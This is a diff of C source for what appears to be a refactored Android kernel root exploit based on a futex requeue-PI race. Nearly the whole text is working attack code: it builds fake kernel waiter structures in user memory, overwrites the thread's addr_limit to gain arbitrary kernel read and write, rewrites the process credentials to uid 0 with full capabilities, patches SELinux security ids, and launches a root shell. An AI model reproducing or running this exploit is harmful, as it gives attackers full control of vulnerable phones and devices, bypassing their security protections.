@@ -1,23 +1,3 @@
-/* getroot 2014/07/12 */
-
-/*
- * Copyright (C) 2014 CUBE
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <http://www.gnu.org/licenses/>.
- *
- */
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -33,30 +13,100 @@
 #define FUTEX_WAIT_REQUEUE_PI   11
 #define FUTEX_CMP_REQUEUE_PI    12
 
-struct mmsghdr {
+#define ARRAY_SIZE(a)		(sizeof (a) / sizeof (*(a)))
+
+#define KERNEL_START		0xc0000000
+
+#define LOCAL_PORT		5551
+
+struct thread_info;
+struct task_struct;
+struct cred;
+struct kernel_cap_struct;
+struct task_security_struct;
+struct list_head;
+
+struct thread_info {
+	unsigned long flags;
+	int preempt_count;
+	unsigned long addr_limit;
+	struct task_struct *task;
+
+	/* ... */
+};
+
+struct kernel_cap_struct {
+	unsigned long cap[2];
+};
+
+struct cred {
+	unsigned long usage;
+	uid_t uid;
+	gid_t gid;
+	uid_t suid;
+	gid_t sgid;
+	uid_t euid;
+	gid_t egid;
+	uid_t fsuid;
+	gid_t fsgid;
+	unsigned long securebits;
+	struct kernel_cap_struct cap_inheritable;
+	struct kernel_cap_struct cap_permitted;
+	struct kernel_cap_struct cap_effective;
+	struct kernel_cap_struct cap_bset;
+	unsigned char jit_keyring;
+	void *thread_keyring;
+	void *request_key_auth;
+	void *tgcred;
+	struct task_security_struct *security;
+
+	/* ... */
+};
+
+struct list_head {
+	struct list_head *next;
+	struct list_head *prev;
+};
+
+struct task_security_struct {
+	unsigned long osid;
+	unsigned long sid;
+	unsigned long exec_sid;
+	unsigned long create_sid;
+	unsigned long keycreate_sid;
+	unsigned long sockcreate_sid;
+};
+
+
+struct task_struct_partial {
+	struct list_head cpu_timers[3];
+	struct cred *real_cred;
+	struct cred *cred;
+	struct cred *replacement_session_keyring;
+	char comm[16];
+};
+
+
+struct mmsghdr2 {
 	struct msghdr msg_hdr;
 	unsigned int  msg_len;
 };
 
-//rodata
-const char str_ffffffff[] = {0xff, 0xff, 0xff, 0xff, 0};
-const char str_1[] = {1, 0, 0, 0, 0};
-
 //bss
-int _swag = 0;
-int _swag2 = 0;
-unsigned long HACKS_final_stack_base = 0;
+int uaddr1 = 0;
+int uaddr2 = 0;
+struct thread_info *HACKS_final_stack_base = NULL;
 pid_t waiter_thread_tid;
 pthread_mutex_t done_lock;
 pthread_cond_t done;
 pthread_mutex_t is_thread_desched_lock;
 pthread_cond_t is_thread_desched;
-int do_socket_tid_read = 0;
-int did_socket_tid_read = 0;
-int do_splice_tid_read = 0;
-int did_splice_tid_read = 0;
-int do_dm_tid_read = 0;
-int did_dm_tid_read = 0;
+volatile int do_socket_tid_read = 0;
+volatile int did_socket_tid_read = 0;
+volatile int do_splice_tid_read = 0;
+volatile int did_splice_tid_read = 0;
+volatile int do_dm_tid_read = 0;
+volatile int did_dm_tid_read = 0;
 pthread_mutex_t is_thread_awake_lock;
 pthread_cond_t is_thread_awake;
 int HACKS_fdm = 0;
@@ -113,26 +163,30 @@ ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
 	return len;
 }
 
-void write_kernel(int signum) {
-	char *slavename;
-	int pipefd[2];
-	char readbuf[0x100];
-	unsigned long stackbuf[4];
-	unsigned long buf_a[0x100];
-	unsigned long val1;
-	unsigned long buf_b[0x40];
-	unsigned long val2;
-	unsigned long buf_c[6];
+void write_kernel(int signum)
+{
+	struct thread_info stackbuf;
+	unsigned long taskbuf[0x100];
+	struct cred *cred;
+	struct cred credbuf;
+	struct task_security_struct *security;
+	struct task_security_struct securitybuf;
 	pid_t pid;
 	int i;
 	int ret;
+	FILE *fp;
 
 	pthread_mutex_lock(&is_thread_awake_lock);
 	pthread_cond_signal(&is_thread_awake);
 	pthread_mutex_unlock(&is_thread_awake_lock);
 
-	if (HACKS_final_stack_base == 0) {
-		printf("cpid1 resumed.\n");
+	if (HACKS_final_stack_base == NULL) {
+		static unsigned long new_addr_limit = 0xffffffff;
+		char *slavename;
+		int pipefd[2];
+		char readbuf[0x100];
+
+		printf("cpid1 resumed\n");
 
 		pthread_mutex_lock(is_kernel_writing);
 
@@ -149,9 +203,11 @@ void write_kernel(int signum) {
 			}
 		}
 
-		read(HACKS_fdm, readbuf, 0x100);
+		read(HACKS_fdm, readbuf, sizeof readbuf);
 
-		write_pipe((void *)(HACKS_final_stack_base + 8), (void *)str_ffffffff, 4);
+		printf("addr_limit: %p\n", &HACKS_final_stack_base->addr_limit);
+
+		write_pipe(&HACKS_final_stack_base->addr_limit, &new_addr_limit, sizeof new_addr_limit);
 
 		pthread_mutex_unlock(is_kernel_writing);
 
@@ -166,104 +222,95 @@ void write_kernel(int signum) {
 
 	printf("hack.\n");
 
-	read_pipe((void *)HACKS_final_stack_base, stackbuf, 0x10);
-	read_pipe((void *)(stackbuf[3]), buf_a, 0x400);
+	read_pipe(HACKS_final_stack_base, &stackbuf, sizeof stackbuf);
+	read_pipe(stackbuf.task, taskbuf, sizeof taskbuf);
 
-	val1 = 0;
-	val2 = 0;
+	cred = NULL;
+	security = NULL;
 	pid = 0;
 
-	for (i = 0; i < 0x100; i++) {
-		if (buf_a[i] == buf_a[i + 1]) {
-			if (buf_a[i] > 0xc0000000) {
-				if (buf_a[i + 2] == buf_a[i + 3]) {
-					if (buf_a[i + 2] > 0xc0000000) {
-						if (buf_a[i + 4] == buf_a[i + 5]) {
-							if (buf_a[i + 4] > 0xc0000000) {
-								if (buf_a[i + 6] == buf_a[i + 7]) {
-									if (buf_a[i + 6] > 0xc0000000) {
-										val1 = buf_a[i + 7];
-										break;
-									}
-								}
-							}
-						}
-					}
-				}
-			}
+	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
+		struct task_struct_partial *task = (void *)&taskbuf[i];
+
+
+		if (task->cpu_timers[0].next == task->cpu_timers[0].prev && (unsigned long)task->cpu_timers[0].next > KERNEL_START
+		 && task->cpu_timers[1].next == task->cpu_timers[1].prev && (unsigned long)task->cpu_timers[1].next > KERNEL_START
+		 && task->cpu_timers[2].next == task->cpu_timers[2].prev && (unsigned long)task->cpu_timers[2].next > KERNEL_START
+		 && task->real_cred == task->cred) {
+			cred = task->cred;
+			break;
 		}
 	}
 
-	read_pipe((void *)val1, buf_b, 0x100);
-	val2 = buf_b[0x16];
-	if (val2 > 0xc0000000) {
-		if (val2 < 0xffff0000) {
-			read_pipe((void *)val2, buf_c, 0x18);
-			if (buf_c[0] != 0) {
-				if (buf_c[1] != 0) {
-					if (buf_c[2] == 0) {
-						if (buf_c[3] == 0) {
-							if (buf_c[4] == 0) {
-								if (buf_c[5] == 0) {
-									buf_c[0] = 1;
-									buf_c[1] = 1;
+	read_pipe(cred, &credbuf, sizeof credbuf);
 
-									write_pipe((void *)val2, buf_c, 0x18);
-								}
-							}
-						}
-					}
-				}
-			}
+	security = credbuf.security;
+
+	if ((unsigned long)security > KERNEL_START && (unsigned long)security < 0xffff0000) {
+		read_pipe(security, &securitybuf, sizeof securitybuf);
+
+		if (securitybuf.osid != 0
+		 && securitybuf.sid != 0
+		 && securitybuf.exec_sid == 0
+		 && securitybuf.create_sid == 0
+		 && securitybuf.keycreate_sid == 0
+		 && securitybuf.sockcreate_sid == 0) {
+			securitybuf.osid = 1;
+			securitybuf.sid = 1;
+
+			printf("task_security_struct: %p\n", security);
+
+			write_pipe(security, &securitybuf, sizeof securitybuf);
 		}
 	}
 
-	buf_b[1] = 0;
-	buf_b[2] = 0;
-	buf_b[3] = 0;
-	buf_b[4] = 0;
-	buf_b[5] = 0;
-	buf_b[6] = 0;
-	buf_b[7] = 0;
-	buf_b[8] = 0;
+	credbuf.uid = 0;
+	credbuf.gid = 0;
+	credbuf.suid = 0;
+	credbuf.sgid = 0;
+	credbuf.euid = 0;
+	credbuf.egid = 0;
+	credbuf.fsuid = 0;
+	credbuf.fsgid = 0;
 
-	buf_b[10] = 0xffffffff;
-	buf_b[11] = 0xffffffff;
-	buf_b[12] = 0xffffffff;
-	buf_b[13] = 0xffffffff;
-	buf_b[14] = 0xffffffff;
-	buf_b[15] = 0xffffffff;
-	buf_b[16] = 0xffffffff;
-	buf_b[17] = 0xffffffff;
+	credbuf.cap_inheritable.cap[0] = 0xffffffff;
+	credbuf.cap_inheritable.cap[1] = 0xffffffff;
+	credbuf.cap_permitted.cap[0] = 0xffffffff;
+	credbuf.cap_permitted.cap[1] = 0xffffffff;
+	credbuf.cap_effective.cap[0] = 0xffffffff;
+	credbuf.cap_effective.cap[1] = 0xffffffff;
+	credbuf.cap_bset.cap[0] = 0xffffffff;
+	credbuf.cap_bset.cap[1] = 0xffffffff;
 
-	write_pipe((void *)val1, buf_b, 0x48);
+	write_pipe(cred, &credbuf, sizeof credbuf);
 
 	pid = syscall(__NR_gettid);
 
-	i = 0;
-	while (1) {
-		if (buf_a[i] == pid) {
-			write_pipe((void *)(stackbuf[3] + (i << 2)), (void *)str_1, 4);
+	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
+		static unsigned long write_value = 1;
+
+		if (taskbuf[i] == pid) {
+			write_pipe(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value);
 
 			if (getuid() != 0) {
-				printf("root failed.\n");
+				printf("ROOT FAILED\n");
 				while (1) {
 					sleep(10);
 				}
-			} else {
+			} else {	//rooted
 				break;
 			}
 		}
-
-		i++;
 	}
 
-	//rooted
 	sleep(1);
 
 	if (g_argc >= 2) {
 		system(rootcmd);
+	} else {
+		system("/system/bin/sh -i");
 	}
+
 	system("/system/bin/touch /dev/rooted");
 
 	pid = fork();
@@ -310,7 +357,10 @@ void *make_action(void *arg) {
 	pthread_cond_signal(&is_thread_desched);
 
 	act.sa_handler = write_kernel;
-	act.sa_mask = 0;
+	//error type
+    //act.sa_mask = 0;
+    sigemptyset(&act.sa_mask);
+    sigaddset(&act.sa_mask, 0);
 	act.sa_flags = 0;
 	act.sa_restorer = NULL;
 	sigaction(12, &act, NULL);
@@ -321,13 +371,11 @@ void *make_action(void *arg) {
 
 	do_dm_tid_read = 1;
 
-	while (1) {
-		if (did_dm_tid_read != 0) {
-			break;
-		}
+	while (did_dm_tid_read == 0) {
+		;
 	}
 
-	ret = syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+	ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
 	printf("futex dm: %d\n", ret);
 
 	while (1) {
@@ -360,18 +408,16 @@ pid_t wake_actionthread(int prio) {
 	fp = fopen(filename, "rb");
 	if (fp == 0) {
 		vcscnt = -1;
-	} else {
-		fread(filebuf, 1, 0x1000, fp);
+	}
+	else {
+		fread(filebuf, 1, sizeof filebuf, fp);
 		pdest = strstr(filebuf, "voluntary_ctxt_switches");
 		pdest += 0x19;
 		vcscnt = atoi(pdest);
 		fclose(fp);
 	}
 
-	while (1) {
-		if (do_dm_tid_read != 0) {
-			break;
-		}
+	while (do_dm_tid_read == 0) {
 		usleep(10);
 	}
 
@@ -382,8 +428,9 @@ pid_t wake_actionthread(int prio) {
 		fp = fopen(filename, "rb");
 		if (fp == 0) {
 			vcscnt2 = -1;
-		} else {
-			fread(filebuf, 1, 0x1000, fp);
+		}
+		else {
+			fread(filebuf, 1, sizeof filebuf, fp);
 			pdest = strstr(filebuf, "voluntary_ctxt_switches");
 			pdest += 0x19;
 			vcscnt2 = atoi(pdest);
@@ -414,7 +461,7 @@ int make_socket() {
 		usleep(10);
 	} else {
 		addr.sin_family = AF_INET;
-		addr.sin_port = htons(5551);
+		addr.sin_port = htons(LOCAL_PORT);
 		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
 	}
 
@@ -434,7 +481,7 @@ int make_socket() {
 
 void *send_magicmsg(void *arg) {
 	int sockfd;
-	struct mmsghdr msgvec[1];
+	struct mmsghdr2 msgvec[1];
 	struct iovec msg_iov[8];
 	unsigned long databuf[0x20];
 	int i;
@@ -445,7 +492,7 @@ void *send_magicmsg(void *arg) {
 
 	sockfd = make_socket();
 
-	for (i = 0; i < 0x20; i++) {
+	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
 		databuf[i] = MAGIC;
 	}
 
@@ -455,15 +502,15 @@ void *send_magicmsg(void *arg) {
 	}
 
 	msgvec[0].msg_hdr.msg_name = databuf;
-	msgvec[0].msg_hdr.msg_namelen = 0x80;
+	msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
 	msgvec[0].msg_hdr.msg_iov = msg_iov;
-	msgvec[0].msg_hdr.msg_iovlen = 8;
+	msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(msg_iov);
 	msgvec[0].msg_hdr.msg_control = databuf;
-	msgvec[0].msg_hdr.msg_controllen = 0x20;
+	msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
 	msgvec[0].msg_hdr.msg_flags = 0;
 	msgvec[0].msg_len = 0;
 
-	syscall(__NR_futex, &_swag, FUTEX_WAIT_REQUEUE_PI, 0, 0, &_swag2, 0);
+	syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
 
 	do_socket_tid_read = 1;
 
@@ -493,6 +540,16 @@ void *send_magicmsg(void *arg) {
 	return NULL;
 }
 
+static inline setup_exploit(unsigned long mem)
+{
+	*((unsigned long *)(mem - 0x04)) = 0x81;
+	*((unsigned long *)(mem + 0x00)) = mem + 0x20;
+	*((unsigned long *)(mem + 0x08)) = mem + 0x28;
+	*((unsigned long *)(mem + 0x1c)) = 0x85;
+	*((unsigned long *)(mem + 0x24)) = mem;
+	*((unsigned long *)(mem + 0x2c)) = mem + 8;
+}
+
 void *search_goodnum(void *arg) {
 	int ret;
 	char filename[256];
@@ -507,10 +564,10 @@ void *search_goodnum(void *arg) {
 	int i;
 	char buf[0x1000];
 
-	syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+	syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
 
 	while (1) {
-		ret = syscall(__NR_futex, &_swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag);
+		ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
 		if (ret == 1) {
 			break;
 		}
@@ -520,11 +577,11 @@ void *search_goodnum(void *arg) {
 	wake_actionthread(6);
 	wake_actionthread(7);
 
-	_swag2 = 0;
+	uaddr2 = 0;
 	do_socket_tid_read = 0;
 	did_socket_tid_read = 0;
 
-	syscall(__NR_futex, &_swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag2);
+	syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
 
 	while (1) {
 		if (do_socket_tid_read != 0) {
@@ -537,8 +594,9 @@ void *search_goodnum(void *arg) {
 	fp = fopen(filename, "rb");
 	if (fp == 0) {
 		vcscnt = -1;
-	} else {
-		fread(filebuf, 1, 0x1000, fp);
+	}
+	else {
+		fread(filebuf, 1, sizeof filebuf, fp);
 		pdest = strstr(filebuf, "voluntary_ctxt_switches");
 		pdest += 0x19;
 		vcscnt = atoi(pdest);
@@ -552,8 +610,9 @@ void *search_goodnum(void *arg) {
 		fp = fopen(filename, "rb");
 		if (fp == 0) {
 			vcscnt2 = -1;
-		} else {
-			fread(filebuf, 1, 0x1000, fp);
+		}
+		else {
+			fread(filebuf, 1, sizeof filebuf, fp);
 			pdest = strstr(filebuf, "voluntary_ctxt_switches");
 			pdest += 0x19;
 			vcscnt2 = atoi(pdest);
@@ -566,21 +625,10 @@ void *search_goodnum(void *arg) {
 		usleep(10);
 	}
 
-	printf("starting the dangerous things.\n");
+	printf("starting the dangerous things\n");
 
-	*((unsigned long *)(MAGIC_ALT - 4)) = 0x81;
-	*((unsigned long *)MAGIC_ALT) = MAGIC_ALT + 0x20;
-	*((unsigned long *)(MAGIC_ALT + 8)) = MAGIC_ALT + 0x28;
-	*((unsigned long *)(MAGIC_ALT + 0x1c)) = 0x85;
-	*((unsigned long *)(MAGIC_ALT + 0x24)) = MAGIC_ALT;
-	*((unsigned long *)(MAGIC_ALT + 0x2c)) = MAGIC_ALT + 8;
-
-	*((unsigned long *)(MAGIC - 4)) = 0x81;
-	*((unsigned long *)MAGIC) = MAGIC + 0x20;
-	*((unsigned long *)(MAGIC + 8)) = MAGIC + 0x28;
-	*((unsigned long *)(MAGIC + 0x1c)) = 0x85;
-	*((unsigned long *)(MAGIC + 0x24)) = MAGIC;
-	*((unsigned long *)(MAGIC + 0x2c)) = MAGIC + 8;
+	setup_exploit(MAGIC_ALT);
+	setup_exploit(MAGIC);
 
 	magicval = *((unsigned long *)MAGIC);
 
@@ -595,18 +643,13 @@ void *search_goodnum(void *arg) {
 		is_kernel_writing = (pthread_mutex_t *)malloc(4);
 		pthread_mutex_init(is_kernel_writing, NULL);
 
-		*((unsigned long *)(MAGIC - 4)) = 0x81;
-		*((unsigned long *)MAGIC) = MAGIC + 0x20;
-		*((unsigned long *)(MAGIC + 8)) = MAGIC + 0x28;
-		*((unsigned long *)(MAGIC + 0x1c)) = 0x85;
-		*((unsigned long *)(MAGIC + 0x24)) = MAGIC;
-		*((unsigned long *)(MAGIC + 0x2c)) = MAGIC + 8;
+		setup_exploit(MAGIC);
 
 		pid = wake_actionthread(11);
 
 		goodval = *((unsigned long *)MAGIC) & 0xffffe000;
 
-		printf("%p is a good number.\n", (void *)goodval);
+		printf("%p is a good number\n", (void *)goodval);
 
 		do_splice_tid_read = 0;
 		did_splice_tid_read = 0;
@@ -629,8 +672,9 @@ void *search_goodnum(void *arg) {
 		fp = fopen(filename, "rb");
 		if (fp == 0) {
 			vcscnt = -1;
-		} else {
-			fread(filebuf, 1, 0x1000, fp);
+		}
+		else {
+			fread(filebuf, 1, sizeof filebuf, fp);
 			pdest = strstr(filebuf, "voluntary_ctxt_switches");
 			pdest += 0x19;
 			vcscnt = atoi(pdest);
@@ -644,8 +688,9 @@ void *search_goodnum(void *arg) {
 			fp = fopen(filename, "rb");
 			if (fp == 0) {
 				vcscnt2 = -1;
-			} else {
-				fread(filebuf, 1, 0x1000, fp);
+			}
+			else {
+				fread(filebuf, 1, sizeof filebuf, fp);
 				pdest = strstr(filebuf, "voluntary_ctxt_switches");
 				pdest += 19;
 				vcscnt2 = atoi(pdest);
@@ -660,12 +705,7 @@ void *search_goodnum(void *arg) {
 
 		goodval2 = 0;
 
-		*((unsigned long *)(MAGIC - 4)) = 0x81;
-		*((unsigned long *)MAGIC) = MAGIC + 0x20;
-		*((unsigned long *)(MAGIC + 8)) = MAGIC + 0x28;
-		*((unsigned long *)(MAGIC + 0x1c)) = 0x85;
-		*((unsigned long *)(MAGIC + 0x24)) = MAGIC;
-		*((unsigned long *)(MAGIC + 0x2c)) = MAGIC + 8;
+		setup_exploit(MAGIC);
 
 		*((unsigned long *)(MAGIC + 0x24)) = goodval + 8;
 
@@ -675,17 +715,12 @@ void *search_goodnum(void *arg) {
 		printf("%p is also a good number.\n", (void *)goodval2);
 
 		for (i = 0; i < 9; i++) {
-			*((unsigned long *)(MAGIC - 4)) = 0x81;
-			*((unsigned long *)MAGIC) = MAGIC + 0x20;
-			*((unsigned long *)(MAGIC + 8)) = MAGIC + 0x28;
-			*((unsigned long *)(MAGIC + 0x1c)) = 0x85;
-			*((unsigned long *)(MAGIC + 0x24)) = MAGIC;
-			*((unsigned long *)(MAGIC + 0x2c)) = MAGIC + 8;
+			setup_exploit(MAGIC);
 
 			pid = wake_actionthread(10);
 
 			if (*((unsigned long *)MAGIC) < goodval2) {
-				HACKS_final_stack_base = *((unsigned long *)MAGIC) & 0xffffe000;
+				HACKS_final_stack_base = (struct thread_info *)(*((unsigned long *)MAGIC) & 0xffffe000);
 
 				pthread_mutex_lock(&is_thread_awake_lock);
 
@@ -694,7 +729,9 @@ void *search_goodnum(void *arg) {
 				pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
 				pthread_mutex_unlock(&is_thread_awake_lock);
 
-				write(HACKS_fdm, buf, 0x1000);
+				printf("GOING\n");
+
+				write(HACKS_fdm, buf, sizeof buf);
 
 				while (1) {
 					sleep(10);
@@ -719,7 +756,7 @@ void *accept_socket(void *arg) {
 	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));
 
 	addr.sin_family = AF_INET;
-	addr.sin_port = htons(5551);
+	addr.sin_port = htons(LOCAL_PORT);
 	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
 	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
@@ -772,21 +809,18 @@ void init_exploit() {
 	pthread_create(&th2, NULL, search_goodnum, NULL);
 	pthread_create(&th3, NULL, send_magicmsg, NULL);
 	pthread_cond_wait(&done, &done_lock);
-
-	return;
 }
 
 int main(int argc, char **argv) {
 	g_argc = argc;
 
 	if (argc >= 2) {
-		strcpy(rootcmd, argv[1]);
+		snprintf(rootcmd, sizeof(rootcmd) - 1, "/system/bin/sh -c '%s'", argv[1]);
 	}
 
 	init_exploit();
 
-	printf("\n");
-	printf("done root command.\n");
+	printf("Finished, looping.\n");
 
 	while (1) {
 		sleep(10);
@@ -794,4 +828,5 @@ int main(int argc, char **argv) {
 
 	return 0;
 }
+
 
